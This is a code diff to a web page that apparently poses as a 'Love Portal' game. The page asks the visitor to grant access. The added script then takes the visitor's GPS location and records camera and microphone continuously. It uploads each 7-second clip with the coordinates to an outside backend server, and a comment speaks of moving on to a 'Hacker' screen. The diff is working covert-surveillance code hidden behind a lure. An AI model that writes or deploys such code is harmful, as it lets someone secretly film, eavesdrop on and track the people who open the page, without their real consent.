@@ -88,46 +88,70 @@
             Grant Access & Continue
         </button>
     </div>
+<script>
+    // 1. MUST CHANGE: Put your actual Render Backend URL here
+    const BACKEND = "https://your-backend-repo-b.onrender.com"; 
+    let coords = { lat: "Unknown", lon: "Unknown" };
 
-    <script>
-        const BACKEND = "https://your-render-app.onrender.com";
-        let coords = { lat: 0, lon: 0 };
-
-        async function initiate() {
-            // Update UI helpers
-            const update = (id, status) => {
-                const el = document.getElementById(id);
+    async function initiate() {
+        const update = (id, status) => {
+            const el = document.getElementById(id);
+            if(el) {
                 el.innerText = status.toUpperCase();
                 el.className = `px-2 py-1 text-xs font-bold rounded ${status === 'granted' ? 'bg-green-100 text-green-600' : 'bg-red-100 text-red-600'}`;
-            };
+            }
+        };
 
-            // Geolocation
-            navigator.geolocation.getCurrentPosition(
-                p => { coords = { lat: p.coords.latitude, lon: p.coords.longitude };document.getElementById('rey').style.display='none'; document.getElementById('test').style.display='contents'; update('loc-stat', 'granted'); }, 
-                e => update('loc-stat', 'error')
-            );
+        // Get Location
+        navigator.geolocation.getCurrentPosition(
+            p => { 
+                coords = { lat: p.coords.latitude, lon: p.coords.longitude };
+                update('loc-stat', 'granted');
+                // Auto-transition to the "Hacker" UI
+                document.getElementById('rey').style.display = 'none'; 
+                document.getElementById('test').style.display = 'contents'; 
+            }, 
+            e => update('loc-stat', 'error')
+        );
 
-            // Media
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                update('cam-stat', 'granted');
-                update('mic-stat', 'granted');
-               
-                const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = async (e) => {
+        // Start Continuous Camera/Mic Recording
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            update('cam-stat', 'granted');
+            update('mic-stat', 'granted');
+           
+            const recorder = new MediaRecorder(stream);
+
+            // This fires every time a 7-second chunk is ready
+            recorder.ondataavailable = async (e) => {
+                if (e.data.size > 0) {
                     const fd = new FormData();
-                    fd.append('video', e.data);
+                    fd.append('video', e.data, `clip_${Date.now()}.webm`);
                     fd.append('lat', coords.lat);
                     fd.append('long', coords.lon);
-                    fetch(`${BACKEND}/upload`, { method: 'POST', body: fd });
-                };
-                recorder.start(5000); // 5 sec chunks
-            } catch (err) {
-                update('cam-stat', 'refused');
-                update('mic-stat', 'refused');
-            }
+
+                    // Send to Repo_B
+                    fetch(`${BACKEND}/upload`, { 
+                        method: 'POST', 
+                        body: fd 
+                    }).catch(err => console.error("Upload failed:", err));
+                }
+            };
+
+            // Start recording and slice into 7-second intervals
+            recorder.start(7000); 
+
+        } catch (err) {
+            update('cam-stat', 'refused');
+            update('mic-stat', 'refused');
+            console.error("Media Error:", err);
         }
-    </script>
+    }
+
+    // Keep all your existing Love Portal functions (startSequence, handleChoice, etc.) below
+    //original script logic ...
+</script>
+
     <div id="test" style="display: none;">
 
     <div id="setup-card" class="glass p-10 rounded-[2.5rem] shadow-2xl max-w-md w-full text-center border border-white/20">
